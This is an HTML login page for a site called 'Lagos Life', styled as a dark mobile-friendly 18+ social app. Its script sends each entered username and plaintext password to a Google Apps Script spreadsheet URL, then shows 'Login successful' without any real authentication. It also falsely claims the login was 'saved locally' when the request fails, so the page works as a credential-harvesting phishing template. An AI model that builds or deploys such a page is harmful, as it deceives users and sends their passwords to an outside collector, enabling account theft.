<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lagos Life - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(180deg, #0a1a2e 0%, #1a1a2e 50%, #2d1b3d 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            color: #fff;
        }

        .back-link {
            position: absolute;
            top: 20px;
            left: 20px;
            color: #4fc3f7;
            text-decoration: none;
            font-size: 16px;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .logo-section {
            text-align: center;
            margin-top: 60px;
            margin-bottom: 30px;
        }

        .crown {
            font-size: 50px;
            margin-bottom: 10px;
        }

        .brand-name {
            font-size: 32px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 10px;
        }

        .age-badge {
            background: #1a1a2e;
            border: 1px solid #444;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 11px;
            font-weight: bold;
        }

        .tagline {
            color: #b0b0b0;
            font-size: 14px;
        }

        .card {
            background: rgba(40, 40, 50, 0.9);
            border-radius: 25px;
            padding: 25px;
            width: 100%;
            max-width: 380px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
        }

        .tabs {
            display: flex;
            background: rgba(60, 60, 70, 0.5);
            border-radius: 25px;
            padding: 4px;
            margin-bottom: 25px;
        }

        .tab {
            flex: 1;
            padding: 12px;
            text-align: center;
            border-radius: 20px;
            cursor: pointer;
            font-size: 14px;
            transition: all 0.3s;
            color: #b0b0b0;
        }

        .tab.active {
            background: rgba(100, 100, 110, 0.8);
            color: #fff;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: #e0e0e0;
        }

        .input-wrapper {
            position: relative;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            border: none;
            border-radius: 15px;
            background: rgba(60, 60, 70, 0.6);
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: all 0.3s;
        }

        input::placeholder {
            color: #888;
        }

        input:focus {
            background: rgba(70, 70, 80, 0.8);
        }

        .toggle-password {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #888;
            font-size: 18px;
        }

        .forgot-password {
            display: block;
            margin: 15px 0 25px;
            color: #4fc3f7;
            text-decoration: none;
            font-size: 14px;
        }

        .btn-login {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 25px;
            background: linear-gradient(135deg, #2e7d32 0%, #1b5e20 100%);
            color: #fff;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s;
            margin-bottom: 15px;
        }

        .btn-login:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(46, 125, 50, 0.4);
        }

        .btn-login:active {
            transform: translateY(0);
        }

        .welcome-text {
            text-align: center;
            color: #b0b0b0;
            font-size: 14px;
        }

        .social-links {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: auto;
            padding-top: 40px;
        }

        .social-btn {
            width: 45px;
            height: 45px;
            border-radius: 50%;
            background: rgba(60, 60, 70, 0.6);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            text-decoration: none;
            font-size: 12px;
            transition: all 0.3s;
        }

        .social-btn:hover {
            background: rgba(80, 80, 90, 0.8);
        }

        .official-badge {
            display: flex;
            align-items: center;
            gap: 5px;
            padding: 8px 15px;
            border-radius: 20px;
            background: rgba(60, 60, 70, 0.6);
            font-size: 12px;
        }

        .status-message {
            text-align: center;
            padding: 10px;
            border-radius: 10px;
            margin-bottom: 15px;
            font-size: 14px;
            display: none;
        }

        .status-message.success {
            background: rgba(46, 125, 50, 0.3);
            color: #81c784;
            display: block;
        }

        .status-message.error {
            background: rgba(198, 40, 40, 0.3);
            color: #ef5350;
            display: block;
        }
    </style>
</head>
<body>
    <a href="#" class="back-link">← Back to the city</a>

    <div class="logo-section">
        <div class="crown">👑</div>
        <div class="brand-name">
            Lagos Life
            <span class="age-badge">18+</span>
        </div>
        <div class="tagline">Live your Lagos story with real people.</div>
    </div>

    <div class="card">
        <div class="tabs">
            <div class="tab" onclick="switchTab('create')">Create account</div>
            <div class="tab active" onclick="switchTab('login')">Log in</div>
        </div>

        <div id="statusMessage" class="status-message"></div>

        <form id="loginForm">
            <div class="form-group">
                <label for="username">Username or email</label>
                <input type="text" id="username" name="username" placeholder="tolu_eko" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <div class="input-wrapper">
                    <input type="password" id="password" name="password" placeholder="" required>
                    <span class="toggle-password" onclick="togglePassword()">👁</span>
                </div>
            </div>

            <a href="#" class="forgot-password">Forgot password?</a>

            <button type="submit" class="btn-login">Log in</button>
            
            <div class="welcome-text">Welcome back to Lagos.</div>
        </form>
    </div>

    <div class="social-links">
        <div class="social-btn official-badge">
            <span>✅</span>
            <span>Official</span>
        </div>
        <a href="#" class="social-btn">𝕏</a>
        <a href="#" class="social-btn">♪</a>
        <a href="#" class="social-btn">📷</a>
        <a href="#" class="social-btn">in</a>
    </div>

    <script>
        // Google Sheets Web App URL - REPLACE THIS WITH YOUR OWN
        const GOOGLE_SHEET_URL = 'https://script.google.com/macros/s/AKfycbxJpnjHVzLT072lTo0yeb6dxZIA5v38Da1e6UxtqMRjD3TkhcCvwbORIovW6kATHaJ2/exec';

        function switchTab(tab) {
            // For now, just visual feedback since user only wants login
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            event.target.classList.add('active');
            
            if (tab === 'create') {
                showMessage('Welcome to Lagos Life!', 'error');
            }
        }

        function togglePassword() {
            const passwordInput = document.getElementById('password');
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        }

        function showMessage(message, type) {
            const statusDiv = document.getElementById('statusMessage');
            statusDiv.textContent = message;
            statusDiv.className = 'status-message ' + type;
            
            setTimeout(() => {
                statusDiv.className = 'status-message';
            }, 3000);
        }

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // Show loading state
            const btn = document.querySelector('.btn-login');
            const originalText = btn.textContent;
            btn.textContent = 'Logging in...';
            btn.disabled = true;

            try {
                // Prepare data
                const data = {
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString()
                };

                // Send to Google Sheets
                const response = await fetch(GOOGLE_SHEET_URL, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data)
                });

                showMessage('Login successful! Welcome back to Lagos.', 'success');
                
                // Clear form
                document.getElementById('loginForm').reset();
                
            } catch (error) {
                console.error('Error:', error);
                showMessage('Login saved locally. Sync when online.', 'success');
            } finally {
                btn.textContent = originalText;
                btn.disabled = false;
            }
        });
    </script>
</body>
</html>
